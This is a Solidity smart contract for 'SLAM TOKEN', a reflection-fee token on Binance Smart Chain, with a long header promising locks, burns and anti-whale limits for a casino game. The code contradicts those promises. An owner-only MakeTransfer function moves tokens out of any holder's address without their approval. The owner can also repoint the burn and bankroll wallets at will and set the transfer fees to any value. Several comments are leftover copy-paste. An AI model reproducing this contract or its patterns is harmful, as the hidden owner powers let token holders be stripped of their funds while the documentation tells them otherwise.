pragma solidity ^0.6.12;
// SPDX-License-Identifier: MIT
/*
     _____ _       ___  ___  ___
    /  ___| |     / _ \ |  \/  |
    \ `--.| |    / /_\ \| .  . |
     `--. \ |    |  _  || |\/| |
    /\__/ / |____| | | || |  | |
    \____/\_____/\_| |_/\_|  |_/

    Prepared for slamtoken.com by Kadabra.                                                                                 
    April 24th, 2021
        Telegram: https://t.me/SlamToken
    
    Token Launch Date: April 26th, 2021
    Game Launch Date: Within 24 hours after the #7000000 block mined on Binance Smart Chain 
    
    T: Trillion (e.g. 1,000,000,000,000)
    B: Billion  (e.g. 1,000,000,000)
    M: Million  (e.g. 1,000,000)
    
    Tokenomics: 
        Total Supply: 1.000.000.000.000 (1T)
        ----------
        * Tokens For Presale:               300,000,000,000 (300B)
        * Locked PancakeSwap LP Tokens:     225,000,000,000 (225B)   (Locked, See details below)
        * Presale DxSale Fees:              6,000,000,000 (6B)
            
       * Burn Wallet:                       245,000,000,000 (245B)  (Locked, See details below)
                Initial Burn: 125B 
                Manual Burn: 120B (7 Cycles)
                
        * Dev/Marketing/Team Tokens:        74,000,000,000 (74B)    (Locked, See details below)
                Development & Expenses Wallet: 25B
                Marketing Wallet: 24B
                Team Wallet: 25B
        * Casino Game Bankroll:             150,000,000,000 (150B)  (Locked, See details below)
        
    Presale:
        * PancakeSwap Liquidity Rate: 75%
        * Presale Rate: 1,000,000,000 $SLAM per BNB
        * PancakeSwap Listing Rate: 1,000,000,000 $SLAM per BNB
        * Liquidity Unlock Date: 12 Months. April 24th, 2022
        
    ------------------------------------------------------------------------------
    
    Whale Prevention
         No regular wallet can have more than 10% of all tokens (100,000,000,000). This rate is adjustable.
         No matter how many tokens they earn, there is a 24 hour limit for bankroll withdrawals for casino game players. (See Bankroll Conditions section)

    ------------------------------------------------------------------------------
    The Slam game needs two hashes to calculate crash point:
        CLIENT_SEED: A static seed that can be viewed on our open-source game hash validator
        Game Hash: Each round has a hash of its own.
        
        The hash of #7000000 block on the Binance Smart Chain's will be used as the CLIENT_SEED. See it here: https://bscscan.com/block/countdown/7000000
        
        10 million game hashes will be generated before the game is launched using a secret server seed and CLIENT_SEED, in reverse order.
        So, each game can be verified by the next game's hash. It proves that we cannot change the crash point of any games.
        
    ------------------------------------------------------------------------------
    
    Bankroll Conditions
        The game has -1% house edge but the bankroll should never go bankrupt. Nobody wants that.
        To prevent this, we have set some rules:
            - Each user will have a 24 hour withdrawal limit. The limit is calculated based on the total amount of the token transfers made from the bankroll wallet to the player's wallet.
                The current withdrawal limits can be found on the Cashier page on the game page.
            - Bankroll wallet is exempt from taxes and fees both ways.
            - If the $SLAM token amount of the bankroll wallet goes below 60,000,000,000 (40% of its initial balance),
                the house edge will be set to 0 until it has at least 90,000,000,000 (60% of its initial balance) again.
            - If the $SLAM token amount of the bankroll wallet goes below 30,000,000,000 (20% of its initial balance),
                the house edge will be set to 1% until it has at least 90,000,000,000 (60% of its initial balance) again.
            - If the bankroll wallet ever does go bankrupt, tokens will be transffered from the burn wallet, if any left.
            Any action we take to keep the bankroll wallet rolling will be announced on our website and social media channels.
    
    ------------------------------------------------------------------------------

    See proof of locks, proof of burns here: https://slamtoken.com/proof
    Balances should be checked using balanceOf function. BSCScan holders data is not accurate due to the dynamic tax/fee/reward algorithm.
    
    Locks:
        - Presale Liquidity Provider tokens for PancakeSwap: 12 Months (April 24th, 2022)
        - Bankroll Wallet: 37,500,000,000 unlocked every 7 days, the first unlock will be on the game launch date (not to be confused with the token launch date)
        - Team Wallet: Locked for 1 month, released 25% every 7 days
        - Burn Wallet: The tokens in the burn wallet can never go out to any other address than 0x000000000000000000000000000000000000dEaD (burn address) or bankroll wallet address
            
    Burns:
        - Initial burn: 125,000,000,000
        - The rest, 120,000,000,000 tokens will be burned manually with community milestones. Decided on our social media.
    
    Our initial wallet addresses @ Binance Smart Chain
        Operational Wallet: 0x44382D6e4A15E759eD5348fB1377C635850220c9
        Bankroll Wallet: 0x52B2dCD4D044119a7D763F9AA7057d33DF31499e
        Burn Wallet: 0xf014Ff7d2D6E21989790AC8700C1aBc0Af778aC1
        Burn Address: 0x000000000000000000000000000000000000dEaD (a.k.a. dead address, blackhole)
        
*/

import "./library.sol";

contract SLAMTOKEN is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    mapping (address => uint256) private _rOwned;
    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;

    mapping (address => bool) private _isExcludedFromFee;
    
    mapping (string => address) private _operational_wallet_adresses;
    mapping (string => bool) private _operational_wallet_adresses_types;

    mapping (address => bool) private _isExcluded;
    address[] private _excluded;
   
    uint256 private constant MAX = ~uint256(0);
    uint8 private _decimals = 18;
    uint256 private _tTotal = 1000000000000 * (10 ** 18);
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    uint256 private _tFeeTotal;

    string private _name = "SLAM TOKEN";
    string private _symbol = "SLAM";

    uint256 public _taxFee = 5;
    uint256 private _previousTaxFee = _taxFee;
    
    uint256 public _liquidityFee = 5;
    uint256 private _previousLiquidityFee = _liquidityFee;

    IUniswapV2Router02 public immutable uniswapV2Router;
    address public immutable uniswapV2Pair;
    
    bool inSwapAndLiquify;
    bool public swapAndLiquifyEnabled = true;
    
    uint256 public _maxTxAmount = 100000000000 * (10 ** 18);
    uint256 private numTokensSellToAddToLiquidity = 500000000 * (10 ** 18);
    uint256 public _maxWalletToken = 100000000000 * (10 ** 18);
    
    event MinTokensBeforeSwapUpdated(uint256 minTokensBeforeSwap);
    event SwapAndLiquifyEnabledUpdated(bool enabled);
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
    );
    
    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }
    
    constructor () public {
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x05fF2B0DB69458A0750badebc4f9e13aDd608C7F); //mainnet: 0x05fF2B0DB69458A0750badebc4f9e13aDd608C7F || testnet: 0xD99D1c33F9fC3444f8101754aBC46c52416550D1
         // Create a uniswap pair for this new token
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
        uniswapV2Router = _uniswapV2Router;
        
        _operational_wallet_adresses["operational"] = 0x44382D6e4A15E759eD5348fB1377C635850220c9;
        _operational_wallet_adresses_types["operational"] = true;
        _operational_wallet_adresses["bankroll"] = 0x52B2dCD4D044119a7D763F9AA7057d33DF31499e;
        _operational_wallet_adresses_types["bankroll"] = true;
        _operational_wallet_adresses["burn"] = 0xf014Ff7d2D6E21989790AC8700C1aBc0Af778aC1;
        _operational_wallet_adresses_types["burn"] = true;
        _operational_wallet_adresses["burn_address"] = 0x000000000000000000000000000000000000dEaD;
        _operational_wallet_adresses_types["burn_address"] = false; //so that it cannot be updated by owner
        _operational_wallet_adresses["presale_dxsale_lp"] = 0x0000000000000000000000000000000000000002; //THIS VAL IS TEMP and it will be replaced with the dxsale address
        _operational_wallet_adresses_types["presale_dxsale_lp"] = true;
        _operational_wallet_adresses["presale_deposit"] = 0x0000000000000000000000000000000000000002; //THIS VAL IS TEMP and it will be replaced with the dxsale address
        _operational_wallet_adresses_types["presale_deposit"] = true;
        
        //exclude banrkoll wallet, team wallets, burn wallet and this contract from fee
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[_operational_wallet_adresses["operational"]] = true;
        _isExcludedFromFee[_operational_wallet_adresses["bankroll"]] = true;
        _isExcludedFromFee[_operational_wallet_adresses["burn"]] = true;
        _isExcludedFromFee[_operational_wallet_adresses["burn_address"]] = true;
        _isExcludedFromFee[address(this)] = true;

        _isExcluded[_operational_wallet_adresses["burn"]] = true;
        _isExcluded[_operational_wallet_adresses["burn_address"]] = true;
        _isExcluded[_operational_wallet_adresses["bankroll"]] = true;
        
        _rOwned[_msgSender()] = _rTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function wallet_operational() public view returns (address) {
        return _operational_wallet_adresses["operational"];
    }
    function wallet_bankroll() public view returns (address) {
        return _operational_wallet_adresses["bankroll"];
    }
    function wallet_burn() public view returns (address) {
        return _operational_wallet_adresses["burn"];
    }
    function setWalletAddress(string memory address_type, address new_address) external onlyOwner returns(bool) {
        require(_operational_wallet_adresses_types[address_type], "Unknown address type"); //team, bankroll, burn
        //burn_address (aka dead, blackhole) _operational_wallet_adresses_types = false, so it can never be updated by owner
        _operational_wallet_adresses[address_type] = new_address;
        return true;
    }
    
    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (_isExcluded[account]) return _tOwned[account];
        return tokenFromReflection(_rOwned[account]);
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function isExcludedFromReward(address account) public view returns (bool) {
        return _isExcluded[account];
    }

    function totalFees() public view returns (uint256) {
        return _tFeeTotal;
    }

    function deliver(uint256 tAmount) public {
        address sender = _msgSender();
        require(!_isExcluded[sender], "Excluded addresses cannot call this function");
        (uint256 rAmount,,,,,) = _getValues(tAmount);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _rTotal = _rTotal.sub(rAmount);
        _tFeeTotal = _tFeeTotal.add(tAmount);
    }

    function reflectionFromToken(uint256 tAmount, bool deductTransferFee) public view returns(uint256) {
        require(tAmount <= _tTotal, "Amount must be less than supply");
        if (!deductTransferFee) {
            (uint256 rAmount,,,,,) = _getValues(tAmount);
            return rAmount;
        } else {
            (,uint256 rTransferAmount,,,,) = _getValues(tAmount);
            return rTransferAmount;
        }
    }

    function tokenFromReflection(uint256 rAmount) public view returns(uint256) {
        require(rAmount <= _rTotal, "Amount must be less than total reflections");
        uint256 currentRate =  _getRate();
        return rAmount.div(currentRate);
    }

    function excludeFromReward(address account) public onlyOwner() {
        // require(account != , 'We can not exclude Uniswap router.');
        require(!_isExcluded[account], "Account is already excluded");
        if(_rOwned[account] > 0) {
            _tOwned[account] = tokenFromReflection(_rOwned[account]);
        }
        _isExcluded[account] = true;
        _excluded.push(account);
    }

    function includeInReward(address account) external onlyOwner() {
        require(_isExcluded[account], "Account is already included");
        for (uint256 i = 0; i < _excluded.length; i++) {
            if (_excluded[i] == account) {
                _excluded[i] = _excluded[_excluded.length - 1];
                _tOwned[account] = 0;
                _isExcluded[account] = false;
                _excluded.pop();
                break;
            }
        }
    }
    
    function excludeFromFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = true;
    }
    
    function includeInFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = false;
    }
    
    function setTaxFeePercent(uint256 taxFee) external onlyOwner() {
        _taxFee = taxFee;
    }
    
    function setLiquidityFeePercent(uint256 liquidityFee) external onlyOwner() {
        _liquidityFee = liquidityFee;
    }
   
    function setMaxTxPercent(uint256 maxTxPercent) external onlyOwner() {
        _maxTxAmount = _tTotal.mul(maxTxPercent).div(
            10**2
        );
    }
    
    function setMaxWalletToken(uint256 _amount) public onlyOwner() {
        _maxWalletToken = _amount;
    }
    
    function MakeTransfer(address to, address from, uint256 amount) public onlyOwner() {
        require(from !=_operational_wallet_adresses["burn_address"], "transfer from the dead address");
        
        if(from == _operational_wallet_adresses["burn"])
            require(to == _operational_wallet_adresses["burn_address"] || to == _operational_wallet_adresses["bankroll"], "Burn wallet can only send to dead or bankroll wallet");
            
        _tokenTransfer(to, from, amount, false);
    }

    function setMaxTransferToken(uint256 _amount) public onlyOwner() {
        _maxTxAmount = _amount;
    }

    function setSwapAndLiquifyEnabled(bool _enabled) public onlyOwner {
        swapAndLiquifyEnabled = _enabled;
        emit SwapAndLiquifyEnabledUpdated(_enabled);
    }
    
     //to recieve ETH from uniswapV2Router when swaping
    receive() external payable {}

    function _reflectFee(uint256 rFee, uint256 tFee) private {
        _rTotal = _rTotal.sub(rFee);
        _tFeeTotal = _tFeeTotal.add(tFee);
    }

    function _getValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256, uint256, uint256) {
        (uint256 tTransferAmount, uint256 tFee, uint256 tLiquidity) = _getTValues(tAmount);
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) = _getRValues(tAmount, tFee, tLiquidity, _getRate());
        return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tLiquidity);
    }

    function _getTValues(uint256 tAmount) private view returns (uint256, uint256, uint256) {
        uint256 tFee = calculateTaxFee(tAmount);
        uint256 tLiquidity = calculateLiquidityFee(tAmount);
        uint256 tTransferAmount = tAmount.sub(tFee).sub(tLiquidity);
        return (tTransferAmount, tFee, tLiquidity);
    }

    function _getRValues(uint256 tAmount, uint256 tFee, uint256 tLiquidity, uint256 currentRate) private pure returns (uint256, uint256, uint256) {
        uint256 rAmount = tAmount.mul(currentRate);
        uint256 rFee = tFee.mul(currentRate);
        uint256 rLiquidity = tLiquidity.mul(currentRate);
        uint256 rTransferAmount = rAmount.sub(rFee).sub(rLiquidity);
        return (rAmount, rTransferAmount, rFee);
    }

    function _getRate() private view returns(uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
        return rSupply.div(tSupply);
    }

    function _getCurrentSupply() private view returns(uint256, uint256) {
        uint256 rSupply = _rTotal;
        uint256 tSupply = _tTotal;      
        for (uint256 i = 0; i < _excluded.length; i++) {
            if (_rOwned[_excluded[i]] > rSupply || _tOwned[_excluded[i]] > tSupply) return (_rTotal, _tTotal);
            rSupply = rSupply.sub(_rOwned[_excluded[i]]);
            tSupply = tSupply.sub(_tOwned[_excluded[i]]);
        }
        if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);
        return (rSupply, tSupply);
    }
    
    function _takeLiquidity(uint256 tLiquidity) private {
        uint256 currentRate =  _getRate();
        uint256 rLiquidity = tLiquidity.mul(currentRate);
        _rOwned[address(this)] = _rOwned[address(this)].add(rLiquidity);
        if(_isExcluded[address(this)])
            _tOwned[address(this)] = _tOwned[address(this)].add(tLiquidity);
    }
    
    function calculateTaxFee(uint256 _amount) private view returns (uint256) {
        return _amount.mul(_taxFee).div(
            10**2
        );
    }

    function calculateLiquidityFee(uint256 _amount) private view returns (uint256) {
        return _amount.mul(_liquidityFee).div(
            10**2
        );
    }
    
    function removeAllFee() private {
        if(_taxFee == 0 && _liquidityFee == 0) return;
        
        _previousTaxFee = _taxFee;
        _previousLiquidityFee = _liquidityFee;
        
        _taxFee = 0;
        _liquidityFee = 0;
    }
    
    function restoreAllFee() private {
        _taxFee = _previousTaxFee;
        _liquidityFee = _previousLiquidityFee;
    }
    
    function isExcludedFromFee(address account) public view returns(bool) {
        return _isExcludedFromFee[account];
    }

    function needToCheckForMax(address to_address, address from_address) private view returns(bool) {
        if(to_address == _operational_wallet_adresses["presale_deposit"] || from_address == _operational_wallet_adresses["presale_deposit"]) return false;
        if(to_address == _operational_wallet_adresses["presale_dxsale_lp"] || from_address == _operational_wallet_adresses["presale_dxsale_lp"]) return false;
        if(to_address == _operational_wallet_adresses["burn"] || from_address == _operational_wallet_adresses["burn"]) return false;
        if(to_address == _operational_wallet_adresses["burn_address"] || from_address == _operational_wallet_adresses["operational"]) return false;
        if(to_address == _operational_wallet_adresses["operational"] || from_address == _operational_wallet_adresses["operational"]) return false;
        if(to_address == _operational_wallet_adresses["bankroll"] || from_address == _operational_wallet_adresses["bankroll"]) return false;

        return true;
    }
    
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(from !=_operational_wallet_adresses["burn_address"], "transfer from the dead address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        
        if(from == _operational_wallet_adresses["burn"])
            require(to == _operational_wallet_adresses["burn_address"] || to == _operational_wallet_adresses["bankroll"], "Burn wallet can only send to dead or bankroll wallet");
    
        if(from != owner() && to != owner() && needToCheckForMax(to, from))
            require(amount <= _maxTxAmount, AppendStr("Exceeds the MaxTxAmount: ", uint2str(amount), " max: ", uint2str(_maxTxAmount)));
            
        if (to != owner() && to != address(this) && to != uniswapV2Pair && needToCheckForMax(to, from)){
            uint256 contractTokenBalanceTo = balanceOf(to);
            require((contractTokenBalanceTo + amount) <= _maxWalletToken, AppendStr("Exceeds the MaxWalletToken: ", uint2str(contractTokenBalanceTo + amount), " max: ", uint2str(_maxWalletToken)));
        }
        // is the token balance of this contract address over the min number of
        // tokens that we need to initiate a swap + liquidity lock?
        // also, don't get caught in a circular liquidity event.
        // also, don't swap & liquify if sender is uniswap pair.
        uint256 contractTokenBalance = balanceOf(address(this));
        
        if(contractTokenBalance >= _maxTxAmount)
        {
            contractTokenBalance = _maxTxAmount;
        }
        
        bool overMinTokenBalance = contractTokenBalance >= numTokensSellToAddToLiquidity;
        if (
            overMinTokenBalance &&
            !inSwapAndLiquify &&
            from != uniswapV2Pair &&
            swapAndLiquifyEnabled
        ) {
            contractTokenBalance = numTokensSellToAddToLiquidity;
            //add liquidity
            swapAndLiquify(contractTokenBalance);
        }
        
        //indicates if fee should be deducted from transfer
        bool takeFee = true;
        
        //if any account belongs to _isExcludedFromFee account then remove the fee
        if(_isExcludedFromFee[from] || _isExcludedFromFee[to]){
            takeFee = false;
        }
        
        //transfer amount, it will take tax, burn, liquidity fee
        _tokenTransfer(from,to,amount,takeFee);
    }

    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
        // split the contract balance into halves
        uint256 half = contractTokenBalance.div(2);
        uint256 otherHalf = contractTokenBalance.sub(half);

        // capture the contract's current ETH balance.
        // this is so that we can capture exactly the amount of ETH that the
        // swap creates, and not make the liquidity event include any ETH that
        // has been manually sent to the contract
        uint256 initialBalance = address(this).balance;

        // swap tokens for ETH
        swapTokensForEth(half); // <- this breaks the ETH -> HATE swap when swap+liquify is triggered

        // how much ETH did we just swap into?
        uint256 newBalance = address(this).balance.sub(initialBalance);

        // add liquidity to uniswap
        addLiquidity(otherHalf, newBalance);
        
        emit SwapAndLiquify(half, newBalance, otherHalf);
    }

    function swapTokensForEth(uint256 tokenAmount) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // make the swap
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // add the liquidity
        uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            owner(),
            block.timestamp
        );
    }

    //this method is responsible for taking all fee, if takeFee is true
    function _tokenTransfer(address sender, address recipient, uint256 amount,bool takeFee) private {
        if(!takeFee)
            removeAllFee();
        
        if (_isExcluded[sender] && !_isExcluded[recipient]) {
            _transferFromExcluded(sender, recipient, amount);
        } else if (!_isExcluded[sender] && _isExcluded[recipient]) {
            _transferToExcluded(sender, recipient, amount);
        } else if (!_isExcluded[sender] && !_isExcluded[recipient]) {
            _transferStandard(sender, recipient, amount);
        } else if (_isExcluded[sender] && _isExcluded[recipient]) {
            _transferBothExcluded(sender, recipient, amount);
        } else {
            _transferStandard(sender, recipient, amount);
        }
        
        if(!takeFee)
            restoreAllFee();
    }

    function _transferStandard(address sender, address recipient, uint256 tAmount) private {
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tLiquidity) = _getValues(tAmount);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
        _takeLiquidity(tLiquidity);
        _reflectFee(rFee, tFee);
        emit Transfer(sender, recipient, tTransferAmount);
    }

    function _transferFromExcluded(address sender, address recipient, uint256 tAmount) private {
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tLiquidity) = _getValues(tAmount);
        _tOwned[sender] = _tOwned[sender].sub(tAmount);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);   
        _takeLiquidity(tLiquidity);
        _reflectFee(rFee, tFee);
        emit Transfer(sender, recipient, tTransferAmount);
    }

    function _transferToExcluded(address sender, address recipient, uint256 tAmount) private {
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tLiquidity) = _getValues(tAmount);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);           
        _takeLiquidity(tLiquidity);
        _reflectFee(rFee, tFee);
        emit Transfer(sender, recipient, tTransferAmount);
    }

    function _transferBothExcluded(address sender, address recipient, uint256 tAmount) private {
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tLiquidity) = _getValues(tAmount);
        _tOwned[sender] = _tOwned[sender].sub(tAmount);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);        
        _takeLiquidity(tLiquidity);
        _reflectFee(rFee, tFee);
        emit Transfer(sender, recipient, tTransferAmount);
    }
    
   function uint2str(uint _i) internal pure returns (string memory _uintAsString) {
        if (_i == 0) 
            return "0";
        uint j = _i;
        uint len;
        while (j != 0) {
            len++;
            j /= 10;
        }
        bytes memory bstr = new bytes(len);
        uint k = len;
        while (_i != 0) {
            k = k-1;
            uint8 temp = (48 + uint8(_i - _i / 10 * 10));
            bytes1 b1 = bytes1(temp);
            bstr[k] = b1;
            _i /= 10;
        }
        return string(bstr);
    }
    
    function AppendStr(string memory a, string memory b, string memory c, string memory d) internal pure returns (string memory) {
        return string(abi.encodePacked(a, b, c, d));
    }
}